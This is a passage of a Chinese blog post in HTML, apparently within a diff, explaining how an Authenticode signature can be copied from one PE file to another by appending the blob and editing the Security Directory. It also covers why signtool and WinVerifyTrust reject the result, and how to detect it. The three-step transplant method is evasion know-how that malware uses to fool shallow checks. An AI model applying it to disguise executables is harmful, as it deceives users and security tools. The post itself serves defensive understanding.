┌───────────────┐  │  │</span><br><span class="line">                         │  │  │   Sections    │  │  │</span><br><span class="line">                         │  │  └───────────────┘  │  │</span><br><span class="line">                         │  │  ┌───────────────┐  │  │</span><br><span class="line">                         │  │  │  Signature    │◄─┘  │</span><br><span class="line">                         │  │  │  (偷取来的)    │     │</span><br><span class="line">                         │  │  └───────────────┘     │</span><br><span class="line">                         │  └─────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h2 id="为什么能”偷”签名"><a href="#为什么能”偷”签名" class="headerlink" title="为什么能”偷”签名"></a>为什么能”偷”签名</h2><h3 id="根本原因：签名数据是独立的二进制块"><a href="#根本原因：签名数据是独立的二进制块" class="headerlink" title="根本原因：签名数据是独立的二进制块"></a>根本原因：签名数据是独立的二进制块</h3><p>Authenticode 签名在 PE 文件中作为一个独立的二进制数据块存在，它：</p>
+<ol>
+<li><strong>不属于任何节区</strong> —— 位于所有 Section 数据之后</li>
+<li><strong>通过 Data Directory 的指针定位</strong> —— 只需修改 <code>VirtualAddress</code> 和 <code>Size</code> 即可让系统找到它</li>
+<li><strong>是自包含的 PKCS#7 结构</strong> —— 包含完整的证书链和签名值</li>
+</ol>
+<p>因此，只需要三步即可完成”移植”：</p>
+<ol>
+<li>从源文件中按偏移和大小<strong>复制出签名的原始字节</strong></li>
+<li>将这些字节<strong>追加到目标文件末尾</strong></li>
+<li><strong>修改目标文件 PE 头</strong>的 Security Directory 使其指向新位置</li>
+</ol>
+<p>操作完成后，Windows 会认为目标文件”拥有”一个数字签名。</p>
+<h2 id="偷取的签名能被校验出来么？"><a href="#偷取的签名能被校验出来么？" class="headerlink" title="偷取的签名能被校验出来么？"></a>偷取的签名能被校验出来么？</h2><p><strong>答案是：能被严格校验发现，但在许多场景下仍然”有效”。</strong></p>
+<h3 id="Authenticode-校验的两个层次"><a href="#Authenticode-校验的两个层次" class="headerlink" title="Authenticode 校验的两个层次"></a>Authenticode 校验的两个层次</h3><table>
+<thead>
+<tr>
+<th>校验层次</th>
+<th>说明</th>
+<th>偷取签名的结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>签名存在性检查</strong></td>
+<td>检查 PE 文件是否包含数字签名结构</td>
+<td>✅ 通过</td>
+</tr>
+<tr>
+<td><strong>签名完整性校验</strong></td>
+<td>验证文件哈希是否与签名中记录的哈希一致</td>
+<td>❌ 失败</td>
+</tr>
+</tbody></table>
+<h3 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h3><h4 id="1-Authenticode-哈希计算"><a href="#1-Authenticode-哈希计算" class="headerlink" title="1. Authenticode 哈希计算"></a>1. Authenticode 哈希计算</h4><p>Windows 在验证签名时，会对 PE 文件计算哈希值。计算过程中会<strong>排除</strong>以下区域：</p>
+<ul>
+<li>PE 头中的 <code>Checksum</code> 字段</li>
+<li><code>IMAGE_DIRECTORY_ENTRY_SECURITY</code> 条目本身（VA 和 Size）</li>
+<li>签名数据本身（文件末尾的证书数据）</li>
+</ul>
+<p>然后将计算出的哈希与签名中嵌入的哈希进行比对。由于目标文件的实际内容（代码段、数据段等）与源文件完全不同，<strong>哈希必然不匹配</strong>，严格校验一定会失败。</p>
+<h4 id="2-为什么有时候”看起来有效”"><a href="#2-为什么有时候”看起来有效”" class="headerlink" title="2. 为什么有时候”看起来有效”"></a>2. 为什么有时候”看起来有效”</h4><p>尽管校验会失败，在以下场景中偷取的签名仍能产生效果：</p>
+<ul>
+<li><strong>文件属性显示</strong>：在 Windows 资源管理器中右键查看文件属性 → 数字签名 选项卡，会显示签名信息（发布者、时间戳等），但状态会标记为”此数字签名无效”</li>
+<li><strong>杀毒软件的宽松检查</strong>：部分杀毒软件在初筛时只检查<strong>签名是否存在</strong>以及<strong>证书是否来自知名发布者</strong>，而不做完整的哈希校验，这可能让恶意文件暂时逃过检测</li>
+<li><strong>某些驱动加载器</strong>：早期或配置不严格的驱动加载流程可能只做浅层检查</li>
+<li><strong>视觉欺骗</strong>：安全分析人员在快速审查文件时，看到”已签名”的标记可能降低警惕</li>
+</ul>
+<h3 id="signtool-校验结果对比"><a href="#signtool-校验结果对比" class="headerlink" title="signtool 校验结果对比"></a>signtool 校验结果对比</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原始已签名文件</span></span><br><span class="line">&gt; signtool verify /pa SourceFile.exe</span><br><span class="line">Successfully verified: SourceFile.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偷取签名后的文件</span></span><br><span class="line">&gt; signtool verify /pa TargetFile.exe</span><br><span class="line">SignTool Error: WinVerifyTrust returned error: 0x80096010</span><br><span class="line">        The digital signature of the object did not verify.</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>signtool verify</code> 或调用 <code>WinVerifyTrust</code> API 进行完整校验时，偷取的签名<strong>一定会被识别为无效</strong>。</p>
+<h2 id="实际效果总结"><a href="#实际效果总结" class="headerlink" title="实际效果总结"></a>实际效果总结</h2><h3 id="能做到的"><a href="#能做到的" class="headerlink" title="能做到的"></a>能做到的</h3><table>
+<thead>
+<tr>
+<th>效果</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>显示签名信息</td>
+<td>文件属性中会出现”数字签名”标签页</td>
+</tr>
+<tr>
+<td>显示发布者</td>
+<td>会展示原始签名的证书主体（如 Microsoft、Google 等）</td>
+</tr>
+<tr>
+<td>绕过浅层检查</td>
+<td>部分安全工具的初步筛选可能被误导</td>
+</tr>
+<tr>
+<td>增加分析成本</td>
+<td>让安全分析人员需要额外步骤来确认签名有效性</td>
+</tr>
+</tbody></table>
+<h3 id="做不到的"><a href="#做不到的" class="headerlink" title="做不到的"></a>做不到的</h3><table>
+<thead>
+<tr>
+<th>限制</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>通过完整校验</td>
+<td><code>WinVerifyTrust</code> 等 API 会返回错误</td>
+</tr>
+<tr>
+<td>绕过驱动签名强制</td>
+<td>Windows 内核强制签名校验（DSE）不会被欺骗</td>
+</tr>
+<tr>
+<td>绕过 SmartScreen</td>
+<td>Windows Defender SmartScreen 会执行完整校验</td>
+</tr>
+<tr>
+<td>获得签名者的信任等级</td>
+<td>系统层面不会赋予该文件任何额外信任</td>
+</tr>
+</tbody></table>
+<h2 id="防御与检测"><a href="#防御与检测" class="headerlink" title="防御与检测"></a>防御与检测</h2><ol>
+<li><strong>始终使用 <code>WinVerifyTrust</code> 进行完整校验</strong>，不要仅检查签名是否存在</li>
+<li><strong>使用 <code>signtool verify /pa</code></strong> 而非肉眼检查文件属性</li>
+<li><strong>对比签名中的哈希与文件实际哈希</strong>，两者不一致即为伪造</li>
+<li><strong>监控 Security Directory 的异常修改</strong>，比如签名偏移指向非常规位置</li>
+<li>安全产品应当实现<strong>深度签名校验</strong>而非仅做存在性检测</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>数字签名偷取本质上是一种<strong>PE 文件结构层面的操纵</strong>——将签名的二进制数据从一个文件复制到另一个文件，并修改 PE 头使系统能定位到该数据。它利用的是签名数据作为独立二进制块存储在文件末尾这一设计特点。</p>
+<p>这种技术<strong>无法通过任何正规的签名校验</strong>，但在浅层检查的场景下具有一定的欺骗性。它常被恶意软件用于降低安全工具的警觉度，或者在视觉上伪装成合法软件。理解这一原理有助于安全从业者在分析中不被表面的”签名”信息所迷惑，始终坚持完整的签名校验流程。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
